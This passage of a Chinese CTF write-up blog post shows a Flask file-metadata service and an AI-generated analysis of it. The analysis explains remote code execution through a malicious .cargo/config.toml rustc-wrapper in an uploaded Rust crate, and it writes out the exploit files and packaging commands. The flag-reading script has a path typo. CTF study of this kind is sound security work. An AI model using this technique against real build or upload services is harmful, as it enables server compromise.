class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> pathlib<br><span class="hljs-keyword">import</span> shutil<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> tarfile<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> zipfile<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, abort, jsonify, render_template, request<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename<br><span class="hljs-keyword">import</span> magic<br><br>app = Flask(__name__)<br>TMP_PARENT = pathlib.Path(<span class="hljs-string">&quot;/tmp/metabox&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">cmd, cwd=<span class="hljs-literal">None</span>, timeout=<span class="hljs-number">20</span></span>):<br>    <span class="hljs-string">&quot;&quot;&quot;Return (stdout, stderr, exit_code).&quot;&quot;&quot;</span><br>    proc = subprocess.run(<br>        cmd,<br>        cwd=cwd,<br>        stdout=subprocess.PIPE,<br>        stderr=subprocess.PIPE,<br>        text=<span class="hljs-literal">True</span>,<br>        timeout=timeout,<br>        env=os.environ,<br>    )<br>    <span class="hljs-keyword">return</span> proc.stdout, proc.stderr, proc.returncode<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_pdf</span>(<span class="hljs-params">file_path: pathlib.Path</span>):<br>    stdout, _stderr, code = run([<span class="hljs-string">&quot;pdfinfo&quot;</span>, <span class="hljs-built_in">str</span>(file_path)])<br>    <span class="hljs-keyword">if</span> code != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;pdfinfo failed&quot;</span>&#125;, <span class="hljs-number">415</span><br><br>    meta = &#123;&#125;<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> stdout.splitlines():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;:&quot;</span> <span class="hljs-keyword">in</span> line:<br>            k, v = line.split(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-number">1</span>)<br>            meta[k.strip()] = v.strip()<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_node_project</span>(<span class="hljs-params">path: pathlib.Path</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> (path / <span class="hljs-string">&quot;package.json&quot;</span>).is_file()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_node_project</span>(<span class="hljs-params">extract_dir: pathlib.Path</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(extract_dir / <span class="hljs-string">&quot;package.json&quot;</span>, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            pkg = json.load(f)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;package.json parse failed&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>    subset = &#123;<br>        k: pkg[k]<br>        <span class="hljs-keyword">for</span> k <span class="hljs-keyword">in</span> (<span class="hljs-string">&quot;name&quot;</span>, <span class="hljs-string">&quot;version&quot;</span>, <span class="hljs-string">&quot;description&quot;</span>, <span class="hljs-string">&quot;scripts&quot;</span>, <span class="hljs-string">&quot;dependencies&quot;</span>)<br>        <span class="hljs-keyword">if</span> k <span class="hljs-keyword">in</span> pkg<br>    &#125;<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: subset&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_rust_crate</span>(<span class="hljs-params">path: pathlib.Path</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">return</span> (path / <span class="hljs-string">&quot;Cargo.toml&quot;</span>).is_file()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_rust_crate</span>(<span class="hljs-params">extract_dir: pathlib.Path</span>):<br>    stdout, _stderr, code = run(<br>        [<span class="hljs-string">&quot;cargo&quot;</span>, <span class="hljs-string">&quot;metadata&quot;</span>, <span class="hljs-string">&quot;--locked&quot;</span>, <span class="hljs-string">&quot;--offline&quot;</span>, <span class="hljs-string">&quot;--format-version&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>],<br>        cwd=extract_dir,<br>    )<br><br>    <span class="hljs-keyword">if</span> code != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">f&quot;Internal Server Error (exit code: <span class="hljs-subst">&#123;code&#125;</span>)&quot;</span>&#125;, <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">try</span>:<br>        meta = json.loads(stdout)<br>    <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Failed to parse JSON&quot;</span>&#125;, <span class="hljs-number">500</span><br><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_image</span>(<span class="hljs-params">file_path: pathlib.Path</span>):<br>    stdout, _stderr, _ = run([<span class="hljs-string">&quot;exiftool&quot;</span>, <span class="hljs-string">&quot;-json&quot;</span>, <span class="hljs-built_in">str</span>(file_path)])<br>    <span class="hljs-keyword">try</span>:<br>        meta = json.loads(stdout <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;null&quot;</span>)<br>    <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>        meta = <span class="hljs-string">&quot;No metadata found&quot;</span><br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">handle_media</span>(<span class="hljs-params">file_path: pathlib.Path</span>):<br>    stdout, _stderr, code = run(<br>        [<br>            <span class="hljs-string">&quot;ffprobe&quot;</span>,<br>            <span class="hljs-string">&quot;-v&quot;</span>,<br>            <span class="hljs-string">&quot;quiet&quot;</span>,<br>            <span class="hljs-string">&quot;-print_format&quot;</span>,<br>            <span class="hljs-string">&quot;json&quot;</span>,<br>            <span class="hljs-string">&quot;-show_format&quot;</span>,<br>            <span class="hljs-string">&quot;-show_streams&quot;</span>,<br>            <span class="hljs-built_in">str</span>(file_path),<br>        ]<br>    )<br>    <span class="hljs-keyword">if</span> code != <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;ffprobe failed&quot;</span>&#125;, <span class="hljs-number">415</span><br><br>    <span class="hljs-keyword">try</span>:<br>        meta = json.loads(stdout <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;null&quot;</span>)<br>    <span class="hljs-keyword">except</span> json.JSONDecodeError:<br>        meta = &#123;<span class="hljs-string">&quot;raw&quot;</span>: stdout.strip()&#125;<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;metadata&quot;</span>: meta&#125;, <span class="hljs-number">200</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_and_probe</span>(<span class="hljs-params">upload</span>):<br>    workdir = TMP_PARENT / <span class="hljs-built_in">str</span>(uuid.uuid4())<br>    workdir.mkdir(parents=<span class="hljs-literal">True</span>, exist_ok=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-keyword">try</span>:<br>        fname = secure_filename(upload.filename) <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;upload.bin&quot;</span><br>        raw_path = workdir / fname<br>        raw_path.write_bytes(upload.read())<br><br>        mime = magic.from_file(<span class="hljs-built_in">str</span>(raw_path), mime=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-keyword">if</span> mime <span class="hljs-keyword">in</span> &#123;<br>            <span class="hljs-string">&quot;application/x-tar&quot;</span>,<br>            <span class="hljs-string">&quot;application/gzip&quot;</span>,<br>            <span class="hljs-string">&quot;application/x-bzip2&quot;</span>,<br>            <span class="hljs-string">&quot;application/zip&quot;</span>,<br>        &#125;:<br>            extract_dir = workdir / <span class="hljs-string">&quot;unpack&quot;</span><br>            extract_dir.mkdir()<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span> mime == <span class="hljs-string">&quot;application/zip&quot;</span>:<br>                    <span class="hljs-keyword">with</span> zipfile.ZipFile(raw_path) <span class="hljs-keyword">as</span> zf:<br>                        zf.extractall(extract_dir)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">with</span> tarfile.<span class="hljs-built_in">open</span>(raw_path) <span class="hljs-keyword">as</span> tf:<br>                        tf.extractall(extract_dir)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">f&quot;archive extraction failed: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>&#125;, <span class="hljs-number">400</span><br><br>            <span class="hljs-keyword">if</span> is_node_project(extract_dir):<br>                <span class="hljs-keyword">return</span> handle_node_project(extract_dir)<br><br>            <span class="hljs-keyword">if</span> is_rust_crate(extract_dir):<br>                <span class="hljs-keyword">return</span> handle_rust_crate(extract_dir)<br><br>            listing = <span class="hljs-built_in">sorted</span>(<br>                <span class="hljs-built_in">str</span>(p.relative_to(extract_dir)) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> extract_dir.rglob(<span class="hljs-string">&quot;*&quot;</span>)<br>            )<br>            <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;listing&quot;</span>: listing&#125;, <span class="hljs-number">200</span><br><br>        <span class="hljs-keyword">if</span> mime.startswith(<span class="hljs-string">&quot;image/&quot;</span>):<br>            <span class="hljs-keyword">return</span> handle_image(raw_path)<br><br>        <span class="hljs-keyword">if</span> mime == <span class="hljs-string">&quot;application/pdf&quot;</span>:<br>            <span class="hljs-keyword">return</span> handle_pdf(raw_path)<br><br>        <span class="hljs-keyword">if</span> mime.startswith(<span class="hljs-string">&quot;audio/&quot;</span>) <span class="hljs-keyword">or</span> mime.startswith(<span class="hljs-string">&quot;video/&quot;</span>):<br>            <span class="hljs-keyword">return</span> handle_media(raw_path)<br><br>        <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">f&quot;unsupported MIME: <span class="hljs-subst">&#123;mime&#125;</span>&quot;</span>&#125;, <span class="hljs-number">415</span><br><br>    <span class="hljs-keyword">finally</span>:<br>        shutil.rmtree(workdir, ignore_errors=<span class="hljs-literal">True</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/upload&quot;</span>, methods=[<span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;file&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>        abort(<span class="hljs-number">400</span>, <span class="hljs-string">&quot;multipart/form-data with field &#x27;file&#x27; required&quot;</span>)<br>    result, code = save_and_probe(request.files[<span class="hljs-string">&quot;file&quot;</span>])<br>    <span class="hljs-keyword">return</span> jsonify(result), code<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8000</span>)<br><br></code></pre></td></tr></table></figure>
+
+<p>直接丢给 <code>gemini</code> 就出了：</p>
+<p>好的，我们来分析这道 CTF 题目的代码并找出获取 flag 的方法。</p>
+<p>简而言之，这段代码的漏洞在于处理 Rust Crate 压缩包时，可以通过在压缩包内构造恶意的 <code>.cargo/config.toml</code> 文件来指定一个在服务器上执行的脚本，从而实现远程代码执行（RCE）。</p>
+<hr>
+<h2 id="代码功能分析-Code-Functionality-Analysis"><a href="#代码功能分析-Code-Functionality-Analysis" class="headerlink" title="代码功能分析 (Code Functionality Analysis)"></a>代码功能分析 (Code Functionality Analysis)</h2><p>首先，我们来梳理一下这个 Flask 应用能处理哪些文件类型。核心逻辑在 <code>save_and_probe</code> 函数中，它通过 <code>python-magic</code> 库识别上传文件的 MIME 类型，然后分发给不同的处理函数：</p>
+<ol>
+<li><strong>压缩文件 (Archives)</strong>:<ul>
+<li>MIME 类型: <code>application/x-tar</code>, <code>application/gzip</code>, <code>application/x-bzip2</code>, <code>application/zip</code></li>
+<li>处理流程:<ul>
+<li>解压文件到一个临时目录。</li>
+<li>检查解压后的目录是否为 <strong>Node.js 项目</strong> (包含 <code>package.json</code>)，如果是，则调用 <code>handle_node_project</code> 解析元数据。</li>
+<li>检查解压后的目录是否为 <strong>Rust Crate</strong> (包含 <code>Cargo.toml</code>)，如果是，则调用 <code>handle_rust_crate</code> 解析元数据。</li>
+<li>如果都不是，就列出压缩包内的所有文件名。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>图片文件 (Images)</strong>:<ul>
+<li>MIME 类型: <code>image/*</code></li>
+<li>处理流程: 调用 <code>handle_image</code> 函数，使用 <code>exiftool</code> 提取图片的 EXIF 元数据。</li>
+</ul>
+</li>
+<li><strong>PDF 文件</strong>:<ul>
+<li>MIME 类型: <code>application/pdf</code></li>
+<li>处理流程: 调用 <code>handle_pdf</code> 函数，使用 <code>pdfinfo</code> 提取 PDF 的元数据。</li>
+</ul>
+</li>
+<li><strong>音视频文件 (Audio&#x2F;Video)</strong>:<ul>
+<li>MIME 类型: <code>audio/*</code> 或 <code>video/*</code></li>
+<li>处理流程: 调用 <code>handle_media</code> 函数，使用 <code>ffprobe</code> 提取媒体文件的元数据。</li>
+</ul>
+</li>
+</ol>
+<p>对于不支持的其他文件类型，服务器会返回 <code>415 Unsupported Media Type</code> 错误。</p>
+<hr>
+<h2 id="漏洞寻找-Vulnerability-Analysis"><a href="#漏洞寻找-Vulnerability-Analysis" class="headerlink" title="漏洞寻找 (Vulnerability Analysis)"></a>漏洞寻找 (Vulnerability Analysis)</h2><p>CTF 中，当看到程序使用 <code>subprocess.run</code> 或类似函数来调用外部命令行工具时，我们应高度警惕命令注入漏洞。我们来逐一排查：</p>
+<ul>
+<li><code>handle_pdf</code>: <code>run([&quot;pdfinfo&quot;, str(file_path)])</code></li>
+<li><code>handle_image</code>: <code>run([&quot;exiftool&quot;, &quot;-json&quot;, str(file_path)])</code></li>
+<li><code>handle_media</code>: <code>run([&quot;ffprobe&quot;, ..., str(file_path)])</code></li>
+</ul>
+<p>在上面这三个调用中，用户可控的输入 <code>file_path</code> 是作为命令行参数列表中的一个独立元素传递的。这是使用 <code>subprocess</code> 的安全方式，可以有效防止简单的命令注入（比如文件名叫 <code>my_file; ls -la</code>）。虽然可能存在参数注入漏洞（比如文件名叫 <code>-o pwned.txt</code>），但 <code>werkzeug.utils.secure_filename</code> 函数会移除文件名前的 <code>-</code>，从而缓解了这类攻击。所以这几处看起来是安全的。</p>
+<ul>
+<li><code>handle_rust_crate</code>: <code>run([&quot;cargo&quot;, &quot;metadata&quot;, ...], cwd=extract_dir)</code></li>
+</ul>
+<p>这个调用就非常可疑了。它没有将用户输入直接作为命令参数，而是<strong>在用户上传并解压后的目录 (<code>extract_dir</code>) 中执行 <code>cargo metadata</code> 命令</strong>。这意味着我们可以完全控制 <code>cargo</code> 命令执行时的环境，特别是其配置文件。</p>
+<p>Cargo 在执行时会读取项目目录下的 <code>.cargo/config.toml</code> 文件。通过这个配置文件，我们可以修改 Cargo 的行为。其中一个极其危险的配置项是 <strong><code>build.rustc-wrapper</code></strong>。</p>
+<p><strong><code>rustc-wrapper</code></strong>: 这个配置项允许你指定一个“包装器”程序。当 Cargo 需要调用 Rust 编译器 (<code>rustc</code>) 时，它不会直接运行 <code>rustc</code>，而是会去运行你指定的那个包装器程序，并将 <code>rustc</code> 和所有编译参数作为包装器程序的参数。</p>
+<p><code>cargo metadata</code> 命令为了获取项目的元数据，需要调用 <code>rustc</code> 来分析源码。因此，如果我们上传一个包含特制 <code>.cargo/config.toml</code> 文件的 Rust Crate 压缩包，就可以让服务器在调用 <code>cargo metadata</code> 时执行我们指定的任意脚本。这就是本次挑战的突破口！🔓</p>
+<hr>
+<h2 id="漏洞利用步骤-Exploitation-Steps"><a href="#漏洞利用步骤-Exploitation-Steps" class="headerlink" title="漏洞利用步骤 (Exploitation Steps)"></a>漏洞利用步骤 (Exploitation Steps)</h2><p>我们的目标是创建一个恶意的 Rust Crate 压缩包。当服务器解压并对其运行 <code>cargo metadata</code> 时，会执行我们预设的命令来读取 flag。</p>
+<p>假设 flag 文件位于 <code>/flag.txt</code>。</p>
+<h3 id="1-创建恶意-Rust-项目结构"><a href="#1-创建恶意-Rust-项目结构" class="headerlink" title="1. 创建恶意 Rust 项目结构"></a>1. 创建恶意 Rust 项目结构</h3><p>首先，在你的本地机器上创建如下的文件和目录结构：</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stylus">exploit-crate/<br>├── .cargo/<br>│   └── config<span class="hljs-selector-class">.toml</span><br>├── <span class="hljs-attribute">src</span>/<br>│   └── lib<span class="hljs-selector-class">.rs</span><br>├── get_flag<span class="hljs-selector-class">.sh</span><br>└── Cargo.toml`<br></code></pre></td></tr></table></figure>
+
+<h3 id="2-编写各个文件内容"><a href="#2-编写各个文件内容" class="headerlink" title="2. 编写各个文件内容"></a>2. 编写各个文件内容</h3><p><strong>a. <code>Cargo.toml</code> (项目描述文件)</strong></p>
+<p>这个文件只需要符合基本格式即可，内容不重要。</p>
+<p>Ini, TOML</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">[package]<br>name = <span class="hljs-string">&quot;exploit&quot;</span><br>version = <span class="hljs-string">&quot;0.1.0&quot;</span><br>edition = <span class="hljs-string">&quot;2021&quot;</span>`<br></code></pre></td></tr></table></figure>
+
+<p><strong>b. <code>src/lib.rs</code> (源码文件)</strong></p>
+<p>这个文件同样只需要存在即可，内容为空都行。</p>
+<p>Rust</p>
+<p><strong>c. <code>get_flag.sh</code> (我们的恶意脚本)</strong></p>
+<p>这是我们想在服务器上执行的脚本。它会读取 flag 文件，并将内容输出到标准输出。Cargo 会捕获这个输出，虽然我们可能在最终的 JSON 响应中看不到它，但命令确实执行了。更稳妥的办法是将 flag 发送到我们自己的服务器上（反向 shell 或 webhook）。这里为了简单演示，我们假设 flag 会被包含在 <code>cargo</code> 的错误输出中返回。</p>
+<p>Bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">cat</span> /flag.tx<br></code></pre></td></tr></table></figure>
+
+<p><strong>重要</strong>: 创建完脚本后，一定要给它添加可执行权限！</p>
+<p>Bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> +x exploit-crate/get_flag.sh<br></code></pre></td></tr></table></figure>
+
+<p><strong>d. <code>.cargo/config.toml</code> (核心配置文件)</strong></p>
+<p>这是整个攻击的核心。我们在这里指定 <code>get_flag.sh</code> 作为 <code>rustc-wrapper</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">[build]<br><span class="hljs-comment"># We use a relative path here. When cargo runs, it will be in the &#x27;exploit-crate&#x27; directory.</span><br>rustc-wrapper = <span class="hljs-string">&quot;./get_flag.sh&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="3-打包并上传"><a href="#3-打包并上传" class="headerlink" title="3. 打包并上传"></a>3. 打包并上传</h3><p>现在，将整个 <code>exploit-crate</code> 目录压缩成一个 <code>.zip</code> 或 <code>.tar.gz</code> 文件。</p>
+<p>Bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 创建 .tar.gz 压缩包</span><br>tar -czvf exploit.tar.gz exploit-crate/<br><br><span class="hljs-comment"># 或者创建 .zip 压缩包</span><br>zip -r exploit.zip exploit-crate/<br></code></pre></td></tr></table></figure>
+
+<p>最后，将生成的 <code>exploit.tar.gz</code> 或 <code>exploit.zip</code> 文件上传到题目的网页上。</p>
+<h3 id="4-获取-Flag"><a href="#4-获取-Flag" class="headerlink" title="4. 获取 Flag"></a>4. 获取 Flag</h3><p>当服务器收到文件后：</p>
+<ol>
+<li>它会检测到这是一个压缩包并解压。</li>
+<li>它会发现解压后的目录包含 <code>Cargo.toml</code>，于是调用 <code>handle_rust_crate</code>。</li>
+<li><code>handle_rust_crate</code> 在解压目录中执行 <code>cargo metadata</code>。</li>
+<li>Cargo 读取 <code>.cargo/config.toml</code> 文件，发现设置了 <code>rustc-wrapper</code>。</li>
+<li>当 Cargo 尝试调用 <code>rustc</code> 时，它实际上会执行 <code>./get_flag.sh</code>。</li>
+<li><code>./get_flag.sh</code> 脚本执行 <code>cat /flag.txt</code>。</li>
+<li><code>cargo metadata</code> 命令可能会因为 wrapper 的异常输出而失败并退出，但我们的脚本已经成功执行了。服务器可能会返回一个 500 错误，但在错误信息中，可能会包含 <code>cargo</code> 的标准错误输出，其中就可能包含了 flag 的内容。</li>
+</ol>
+<p>通过以上步骤，你就可以成功执行命令并拿到 flag 了。🚩</p>
+<p>本次 <code>CTF</code> 比赛完成的相关内容就如上了。</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/CTF/" class="category-chain-item">CTF</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/" class="print-no-link">#CTF</a>
+      
+        <a href="/tags/pwn/" class="print-no-link">#pwn</a>
+      
+        <a href="/tags/rust/" class="print-no-link">#rust</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>2025 FordID CTF</div>
+      <div>http://spongebob-369.github.io/2025/09/14/2025-FordID-CTF/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>SpongeBob</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>September 14, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/09/11/MIT-OS-Chp1/" title="MIT_OS_Chp1">
+                        <span class="hidden-mobile">MIT_OS_Chp1</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
